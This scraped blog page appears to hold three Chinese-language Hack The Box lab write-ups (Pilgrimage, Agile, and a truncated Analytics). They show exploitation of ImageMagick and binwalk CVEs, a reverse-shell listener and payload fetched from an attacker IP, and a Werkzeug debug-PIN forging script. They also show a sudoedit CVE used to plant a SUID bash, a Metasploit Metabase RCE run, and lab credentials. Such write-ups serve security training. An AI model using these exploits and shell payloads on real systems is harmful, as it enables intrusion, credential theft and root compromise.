-sV -sC -O -p80 10.10.11.219Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-24 12:40 CSTStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 0.00% doneNmap scan report for pilgrimage.htb (10.10.11.219)Host is up (0.071s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.18.0|_http-title: Pilgrimage - Shrink Your Images| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-git: | 10.10.11.219:80/.git/| Git repository found!| Repository description: Unnamed repository; edit this file 'description' to name the...|_ Last commit message: Pilgrimage image shrinking service initial commit. # Please ...|_http-server-header: nginx/1.18.0Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: firewallRunning: Fortinet embeddedOS details: Fortinet FortiGate-50B or 310B firewallOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds GITHACK扫描根据上一步搜集的Git repository;知道有git泄露； 1python3 GitHack.py http://pilgrimage.htb/.git/ 123456789101112ls -al总计 26968drwxr-xr-x 4 kali kali 4096 1月24日 12:46 .drwxr-xr-x 5 kali kali 4096 1月24日 12:45 ..drwxr-xr-x 6 kali kali 4096 1月24日 12:45 assets-rw-r--r-- 1 kali kali 5538 1月24日 12:46 dashboard.php-rw-r--r-- 1 kali kali 9250 1月24日 12:46 index.php-rw-r--r-- 1 kali kali 6822 1月24日 12:46 login.php-rw-r--r-- 1 kali kali 98 1月24日 12:46 logout.php-rw-r--r-- 1 kali kali 27555008 1月24日 12:46 magick-rw-r--r-- 1 kali kali 6836 1月24日 12:46 register.phpdrwxr-xr-x 4 kali kali 4096 1月24日 12:46 vendor userimagemagick 1234567891011121314151617181920212223242526#index.phpif ($_SERVER['REQUEST_METHOD'] === 'POST') { $image = new Bulletproof\\Image($_FILES); if($image[&quot;toConvert&quot;]) { $image-&gt;setLocation(&quot;/var/www/pilgrimage.htb/tmp&quot;); $image-&gt;setSize(100, 4000000); $image-&gt;setMime(array('png','jpeg')); $upload = $image-&gt;upload(); if($upload) { $mime = &quot;.png&quot;; $imagePath = $upload-&gt;getFullPath(); if(mime_content_type($imagePath) === &quot;image/jpeg&quot;) { $mime = &quot;.jpeg&quot;; } $newname = uniqid(); exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime); unlink($upload-&gt;getFullPath()); $upload_path = &quot;http://pilgrimage.htb/shrunk/&quot; . $newname . $mime; if(isset($_SESSION['user'])) { $db = new PDO('sqlite:/var/db/pilgrimage'); $stmt = $db-&gt;prepare(&quot;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&quot;); $stmt-&gt;execute(array($upload_path,$_FILES[&quot;toConvert&quot;][&quot;name&quot;],$_SESSION['user'])); } header(&quot;Location: /?message=&quot; . $upload_path . &quot;&amp;status=success&quot;); } 分析代码，可以看出它处理网站上图像的上传和调整大小。它还验证用户是否经过身份验证并返回他们的用户名。如果请求是 POST 方法并且发送图像以调整大小，则代码会处理该图像，将其保存到特定位置，并将信息记录在数据库中。随后，用户被重定向到基于该过程的结果显示成功或失败消息的页面。 该代码利用 ImageMagick（特别是“magick Convert”命令）来调整上传文件的大小并将其保存在 /shrunk 路径中 ImageMagick从命令行调用magick，是一个免费的开源跨平台软件套件，用于显示、创建、转换、修改和编辑光栅图像 查看magick版本得知7.1.0-49,此版本存在CVE-2022-44268，任意文件读取漏洞； 1234567./magick --versionVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.orgCopyright: (C) 1999 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlibCompiler: gcc (7.5) 直接利用poc 12git clone https://github.com/voidz0r/CVE-2022-44268cargo run &quot;/etc/passwd&quot; Cargo 是Rust 编程语言的构建和依赖管理工具。Cargo 为 Rust 项目提供构建、测试和依赖管理功能。 上传生成的image.png图片，并下载下来 identify命令通常用于识别和显示图像文件的信息，比如格式、分辨率、色彩深度等;-verbose参数用于显示更详细的图像信息，包括像素值、颜色深度、压缩类型等。使用-verbose参数可以获取更全面的图像文件信息。 grep工具，其中-P参数表示使用Perl兼容的正则表达式，-v参数表示反向匹配，即匹配不包含指定模式的行。 正则表达式”^( |Image)”的意思是匹配以空格或者”Image”开头的行。因此，整个命令的意思是从输入中过滤掉以空格或”Image”开头的行，只显示不匹配这个模式的行。 123456789101112131415161718192021222324252627282930313233343536373839404142identify -verbose 65b098f813ad9.png|grep -Pv &quot;^( |Image)&quot; 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a 进行hex解码得到如下 123456789101112131415161718192021222324252627root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:109::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinemily:x:1000:1000:emily,,,:/home/emily:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologin_laurel:x:998:998::/var/log/laurel:/bin/false 其中明显存在一个用户:emily 在register.php中可以知道数据库为sqlite且文件路径为/var/db/pilgrimage 12345678#register.phpif ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['username'] &amp;&amp; $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; $db = new PDO('sqlite:/var/db/pilgrimage'); $stmt = $db-&gt;prepare(&quot;INSERT INTO `users` (username,password) VALUES (?,?)&quot;); $status = $stmt-&gt;execute(array($username,$password)); 尝试得到”/var/db/pilgrimage”文件,重复上面的操作，上传图像并下载； 1cargo run &quot;/var/db/pilgrimage&quot; 12345identify -verbose 65b09b31d31ba.png| grep -Pv &quot;^( |Image)&quot;53514c69746520666f726d617420330010000101004020200000007c000000050000000000000000000000040000000400000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000007c002e4b910d0ff800040***** 因为它是二进制数据，并且脚本似乎只支持 ASCII 文本。我可以手动从文件中获取数据。我将从网站下载该文件，并稍微使用一下grep，我可以仅隔离带有十六进制数据的行，然后使用xxd将其转换回二进制： 1identify -verbose 65b09b31d31ba.png| grep -Pv &quot;^( |Image)&quot;| xxd -r -p &gt; pilgrimage.sqlite 使用了xxd工具，-r参数表示将十六进制转换为二进制，-p参数表示使用简洁模式（不输出地址和ASCII码），&gt;表示将输出重定向到文件pilgrimage.sqlite中。 pilgrimage.sqlite的users表中发现用户emily的密码， 12345678chmod +x ./pilgrimage.sqlite sqlite3 pilgrimage.sqlite SQLite version 3.43.1 2023-09-11 12:01:27Enter &quot;.help&quot; for usage hints.sqlite&gt; .tablesimages users sqlite&gt; select * from users;emily|abigchonkyboi123 ssh连接 12ssh emily@10.10.11.219password:abigchonkyboi123 binwalk权限检查 123emily@pilgrimage:~$ sudo -l [sudo] password for emily: Sorry, user emily may not run sudo on pilgrimage. find / -perm -u=s -type f 2&gt;/dev/null也无果之后查看root进程； 1234567ps -aux|grep rootroot 765 0.0 0.0 6816 2844 ? Ss Nov09 0:00 /bin/bash /usr/sbin/malwarescan.shroot 766 0.0 0.0 0 0 ? S Nov09 0:00 [hwmon1] root 771 0.0 0.6 209752 27736 ? Ss Nov09 1:07 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)root 773 0.0 0.1 220796 6840 ? Ssl Nov09 0:00 /usr/sbin/rsyslogd -n -iNONE root 775 0.0 0.0 2516 720 ? S Nov09 0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/root 776 0.0 0.0 6816 2288 ? S Nov09 0:00 /bin/bash /usr/sbin/malwarescan.sh 根正在运行/usr/sbin/malwarescan.sh。还有一个inotifywait正在运行的进程正在监视要在目录中创建的文件/var/www/pilgrimage.htb/shrunk。inotifywait是一种每当文件系统上发生某些事件时触发进程的方法。 /usr/sbin/malwarescan.sh内容如下 123456789101112131415#!/bin/bashblacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')&quot; binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot; for banned in &quot;${blacklist[@]}&quot;; do if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then /usr/bin/rm &quot;$filename&quot; break fi donedone inotifywait是一个Linux命令行工具，用于监视文件系统事件。它依赖于Linux内核提供的inotify接口，可以监视文件或目录的变化，比如文件的创建、删除、修改、移动等操作。当指定的文件或目录发生变化时，inotifywait可以立即响应并执行相应的操作，比如运行特定的命令或脚本 Binwalk 是一个用于搜索给定二进制图像中嵌入文件和可执行代码的工具。具体来说，它设计用于识别固件映像中嵌入的文件和代码。 发现的Binwalk版本为2.3.2，该版本存在允许任意代码执行的漏洞CVE-2022-4510。我们将利用此漏洞来升级我们的访问权限。 利用poc 1python3 exp.py image.png 10.10.16.8 5555 将生成的”binwalk_exploit.png”上传到”/var/www/pilgrimage.htb/shrunk/“目录下 1python3 -m http.server 1wget http://10.10.16.8:8000/binwalk_exploit.png 本地监听得到反弹shell 1nc -lnvp 5555 总结使用nmap扫描出80端口和git泄露;审计源码；发现上传后的文件会经过magick处理，而git泄露了magick二进制文件；magick --version发现此版本存在任意文件读取漏洞；在源码中发现了数据库sqlite的数据库文件路径，通过magick泄露出数据库文件；从中发现了用户名及密码:emily|abigchonkyboi123;ssh连接后，常规权限检查并没有发现可利用点，通过查找root用户进程，/usr/sbin/malwarescan.sh中执行这binwalk -e $filename操作，并且binwalk版本为2.3.2存在任意命令执行漏洞；最终利用此漏洞提权成功","link":"/2024/01/24/Pilgrimage(HTB)/"},{"title":"Agile(HTB)","text":"信息搜集12345678910111213141516171819202122232425262728┌──(kali㉿kali)-[~]└─$ sudo nmap -p- -min-rate 10000 10.10.11.203Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:50 CSTNmap scan report for superpass.htb (10.10.11.203)Host is up (0.091s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 6.87 seconds ┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -sC -O -p80 10.10.11.203Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:52 CSTNmap scan report for superpass.htb (10.10.11.203)Host is up (0.12s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: SuperPassword \\xF0\\x9F\\xA6\\xB8Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 对目录，和子域名搜集无果后，直接访问80; 文件读取随意注册一个账号，并登录；在/vault下有一个记录用户名和密码的功能，并且可以导出， “导出”的http-header的get请求 12GET /download?fn=12345_export_9b398f27c8.csv HTTP/1.1Host: superpass.htb 这里并不难发现，”导出”功能点存在，目录穿越导致任意文件下载；并且可以看到corum,edwards,dev_admin用户位于”/home/“下； 即使这里存在文件读取，但是不知道敏感信息到路径等，无法得到立足点； flask算pin码在注册用户时，有一个flask的报错；得知，这是一个flask应用；当我尝试通过文件读取拿到flask默认app应用的源码是/app/app.py时，并没有这个文件，看来路径没我想到那么简单； 我试着看看flask的动态调试是否开启,访问/console路径，返回的是：”404 Not Found”;我以前都是这样查看flask的动态调试是否为开启状态的；我自以为访问/console没有回显就是动态调试为关闭；实时证明我是多么愚蠢； 在报错页面，点击右侧的小窗口即，就会弹出要求输入pin的框 打ctf打多了的，一下就想到了”文件读取”+”pin码”；很明显需要我们通过文件读取从而计算pin码； 在hacktricks上有一篇关于计算pin码的文章，值得一看； flask的pin码计算，根据环境和版本的不同，计算的方式不同。怎么确定用那种方式呢？在这台靶机中我们可以利用文件读取来查看这台机器计算pin码的源码 /app/venv/lib/python3.10是根据报错页面得到的，site-packages/werkzeug/debug/__init__.py则是固定路径 1/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py 源码太长,只贴一部分，从中可以看出是以sha1的方式计算的，我们对应的脚本也应该用sha1; 12345678910probably_public_bits = [ username, modname, getattr(app, &quot;__name__&quot;, type(app).__name__), getattr(mod, &quot;__file__&quot;, None),]private_bits = [str(uuid.getnode()), get_machine_id()]h = hashlib.sha1() username 是启动此FLASK的用户；有一个比较聪明的办法，通过环境变量/proc/self/environ， 如果环境变量中没有，那就估计只能泄露/etc/passwd一个一个试了 modname is flask.app getattr(app, &quot;__name__&quot;, type(app).__name__)这里的第三个值默认的Flask，但情况并非总是如此;而是’wsgi_app’;这与 Flask 在主机上的启动方式有关。 这一点可以通过/proc/self/cmdline；cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令 1/app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app 这个命令的意思是使用Python虚拟环境中的Python 3解释器来运行Gunicorn服务器，绑定到本地的5000端口，使用10个线程处理请求，并设置请求超时时间为600秒，同时运行名为app的WSGI应用程序; getattr(mod, '__file__', None) 是Flask目录中app.py的绝对路径，通过报错页面得知； uuid.getnode()是当前计算机的MAC地址，str(uuid.getnode())是mac地址的十进制表达。 要查找服务器 MAC 地址，需要知道正在使用哪个网络接口来为应用程序提供服务（例如eth0）。如果未知，则泄漏/proc/net/arp设备 ID，然后泄漏MAC 地址/sys/class/net/&lt;device id&gt;/address。 12&gt;&gt;&gt; int(&quot;00:50:56:b9:1e:a9&quot;.replace(&quot;:&quot;,&quot;&quot;),16) 345052356265 get_machine_id()在源码中是一个函数，主要的功能是放回”/etc/machine-id”或者”/proc/sys/kernel/random/boot_id”之中一个(machine-id更优先)，和”/proc/self/cgroup”的值以/分割的第一个放回值，这一点可能表达的不是很清楚，自己看看源码就懂了； 贴了get_machine_id()函数中的一部分代码； 123456789101112131415161718192021for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;: try: with open(filename, &quot;rb&quot;) as f: value = f.readline().strip() except OSError: continue if value: linux += value break#这里有一个break,如果可以拿到&quot;/etc/machine-id&quot;就会退出try: with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f: linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]except OSError: passif linux: return linux 1234567891011121314151617181920212223242526272829303132333435363738394041424344# sha1import hashlibfrom itertools import chainprobably_public_bits = [ 'www-data' 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py' ]private_bits = [ '345052356265', # /sys/class/net/eth0/address 16进制转10进制 'ed5b159560f54721827644bc9b220d00superpass.service']h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) user-corum发现敏感文件，其实在/app目录下也只有config_prod.json文件对www-data可读 12cat config_prod.json {&quot;SQL_URI&quot;: &quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;} 伪终端 1python3 -c &quot;import pty;pty.spawn('/bin/bash');&quot; 连接数据库 12mysql -usuperpassuser -p password: dSA6l7q*yIVs$39Ml6ywvgK 从superpass.passwords表中发现corum用户的密码：5db7caa1d13cc37c9fc2 12ssh corum@10.10.11.203password:5db7caa1d13cc37c9fc2 权限检查 1234corum@agile:~$ sudo -l[sudo] password for corum: Sorry, user corum may not run sudo on agile. Chrome调试从/etc/hosts发现子域名”test.superpass.htb” 123corum@agile:~$ cat /etc/hosts127.0.0.1 localhost superpass.htb test.superpass.htb127.0.1.1 agile 查看子域名的nginx配置文件；它仅在本地主机上侦听，并将所有内容代理到本地主机 5555。 1234567891011121314151617corum@agile:/etc/nginx/sites-available$ cat /etc/nginx/sites-available/superpass-test.nginx server { listen 127.0.0.1:80; server_name test.superpass.htb; location /static { alias /app/app-testing/superpass/static; expires 365d; } location / { include uwsgi_params; proxy_pass http://127.0.0.1:5555; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-Protocol $scheme; }} 通过ssh本地端口转发到kali机上； 1ssh -L 5555:localhost:5555 corum@superpass.htb 而然，这并没有帮助； 在/tests/functional/test_site_interactively.py文件发现在动态调试selenium；之前python爬虫用过selenium; Selenium是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485corum@agile:/app/app-testing$ cat ./tests/functional/test_site_interactively.py import osimport pytestimport timefrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitwith open('/app/app-testing/tests/functional/creds.txt', 'r') as f: username, password = f.read().strip().split(':') @pytest.fixture(scope=&quot;session&quot;)def driver(): options = Options() #options.add_argument(&quot;--no-sandbox&quot;) options.add_argument(&quot;--window-size=1420,1080&quot;) options.add_argument(&quot;--headless&quot;) options.add_argument(&quot;--remote-debugging-port=41829&quot;) options.add_argument('--disable-gpu') options.add_argument('--crash-dumps-dir=/tmp') driver = webdriver.Chrome(options=options) yield driver driver.close()def test_login(driver): print(&quot;starting test_login&quot;) driver.get('http://test.superpass.htb/account/login') time.sleep(1) username_input = driver.find_element(By.NAME, &quot;username&quot;) username_input.send_keys(username) password_input = driver.find_element(By.NAME, &quot;password&quot;) password_input.send_keys(password) driver.find_element(By.NAME, &quot;submit&quot;).click() time.sleep(3) title = driver.find_element(By.TAG_NAME, &quot;h1&quot;) assert title.text == &quot;Welcome to your vault&quot;def test_add_password(driver): print(&quot;starting test_add_password&quot;) driver.find_element(By.NAME, &quot;add_password&quot;).click() time.sleep(3) site = driver.find_element(By.NAME, &quot;url&quot;) site.send_keys(&quot;test_site&quot;) username = driver.find_element(By.NAME, &quot;username&quot;) username.send_keys(&quot;test_user&quot;) driver.find_element(By.CLASS_NAME, &quot;fa-save&quot;).click() time.sleep(3) assert 'test_site' in driver.page_source assert 'test_user' in driver.page_sourcedef test_del_password(driver): print(&quot;starting test_del_password&quot;) password_rows = driver.find_elements(By.CLASS_NAME, &quot;password-row&quot;) for row in password_rows: if &quot;test_site&quot; == row.find_elements(By.TAG_NAME, &quot;td&quot;)[1].text and \\ &quot;test_user&quot; == row.find_elements(By.TAG_NAME, &quot;td&quot;)[2].text: row.find_element(By.CLASS_NAME, &quot;fa-trash&quot;).click() time.sleep(3) assert 'test_site' not in driver.page_source assert 'test_user' not in driver.page_sourcedef test_title(driver): print(&quot;starting test_title&quot;) driver.get('http://test.superpass.htb') time.sleep(3) assert &quot;SuperPassword 🦸&quot; == driver.titledef test_long_running(driver): print(&quot;starting test_long_running&quot;) driver.get('http://test.superpass.htb') time.sleep(550) #time.sleep(5) assert &quot;SuperPasword 🦸&quot; == driver.title 从文件中发现”–remote-debugging-port=41829” 12corum@agile:/app/app-testing$ netstat -ltun|grep 41829tcp 0 0 127.0.0.1:41829 0.0.0.0:* LISTEN 本地端口转发 1ssh -L 41829:localhost:41829 corum@superpass.htb 打开 Chromium 并chrome://inspect转到设备页面 单击“done”会显示一个新的远程目标： 单击“inspect”会弹出一个连接到测试 selenium 的开发工具实例： 从中可以发现”edwards”用户的密码：”d07867c6267dcb5df0af” user-edwards12corum@agile:~$ su edwardsPassword: d07867c6267dcb5df0af 权限检查 12345678910edwards@agile:~$ sudo -l[sudo] password for edwards: Matching Defaults entries for edwards on agile: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser edwards may run the following commands on agile: (dev_admin : dev_admin) sudoedit /app/config_test.json (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt 发现可以用dev_admin用户的sudoedit命令编辑两个文件；这两个文件似乎并没有什么帮助； 12345sudo -u dev_admin sudoedit /app/config_test.json{&quot;SQL_URI&quot;:&quot;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&quot;} 12sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txtedwards:1d7ffjwrx#$d6qn!9nndqgde4 sudo版本从1.8.0到1.9.12p1之间存在CVE-2023-22809 123456edwards@agile:~$ sudo --versionSudo version 1.9.9Sudoers policy plugin version 1.9.9Sudoers file grammar version 48Sudoers I/O plugin version 1.9.9Sudoers audit plugin version 1.9.9 此漏洞允许用户在用户提供的环境变量中提供额外的参数，从而允许攻击者访问配置允许的其他文件以进行处理。此处应用允许 edwards 将任何文件写入 dev_admin，而不仅仅是这两个。 我们只能编辑以前作为dev_admin找到的文件。在/app中找到的test_and_upgrade.sh bash脚本显示了一个有趣的命令，特别source /app/venv/bin/activate 1234567891011121314151617edwards@agile:/app$ cat test_and_update.sh#!/bin/bash# update prod with latest from testing constantly assuming tests are passingecho &quot;Starting test_and_update&quot;date# if already running, exitps auxww | grep -v &quot;grep&quot; | grep -q &quot;pytest&quot; &amp;&amp; exitecho &quot;Not already running. Starting...&quot;# start in dev foldercd /app/app-testing# system-wide source doesn't seem to happen in cron jobssource /app/venv/bin/activate# run tests, exit if failurepytest -x 2&gt;&amp;1 &gt;/dev/null || exit# tests good, update prod (flask debug mode will load it instantly)cp -r superpass /app/app/echo &quot;Complete!&quot; 我们可以看到，该文件由根目录所有，组归dev_admin所有，后者拥有编辑该文件的权限。 12edwards@agile:~$ ls -al /app/venv/bin/activate-rw-rw-r-- 1 root dev_admin 1976 Aug 5 17:03 /app/venv/bin/activate 利用CVE-2023-22809往/app/venv/bin/activate写恶意代码； 1EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json 恶意代码如下； 12cp /bin/bash /tmp/zixydchmod 4777 /tmp/zixyd 最后等几分钟， 12345edwards@agile:~# ls -al /tmp/zixyd-rwsrwxrwx 1 root root 1396520 Jan 25 14:04 /tmp/zixydedwards@agile:~# /tmp/zixyd -pedwards@agile:~# cd /rootedwards@agile:/root#","link":"/2024/01/25/Agile(HTB)/"},{"title":"Analytics(HTB)","text":"信息搜集1234567891011sudo nmap -p- -min-rate 10000 10.10.11.233[sudo] kali 的密码：Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 13:44 CSTNmap scan report for analytical.htb (10.10.11.233)Host is up (0.12s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 7.20 seconds /etc/hosts 1210.10.11.233 analytical.htb10.10.11.233 data.analytical.htb user-metabase发现 Metabase 有一个最近披露的预身份验证 RCE 漏洞;CVE-2023-38646 该系统在0.46.6.1之前的开源版本和1.46.6.1之前的企业版本中存在漏洞。 /api/session/properties（无需授权也可访问）泄露setup-token； 我这里直接用msf； 12345678910111213141516171819202122232425262728293031323334┌──(kali㉿kali)-[~]└─$ msfconsolemsf6 &gt; search metabaseMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/metabase_setup_token_rce 2023-07-22 excellent Yes Metabase Setup Token RCEInteract with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce msf6 &gt; use 0[*] Using configured payload cmd/unix/reverse_bashmsf6 exploit(linux/http/metabase_setup_token_rce) &gt; set rhost http://data.analytical.htb/rhost =&gt; http://data.analytical.htb/msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set lhost 10.10.16.5lhost =&gt; 10.10.16.5msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set rport 80rport =&gt; 80msf6 exploit(linux/http/metabase_setup_token_rce) &gt; run[*] Started reverse TCP handler on 10.10.16.5:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target appears to be vulnerable. Version Detected: 0.46.6[+] Found 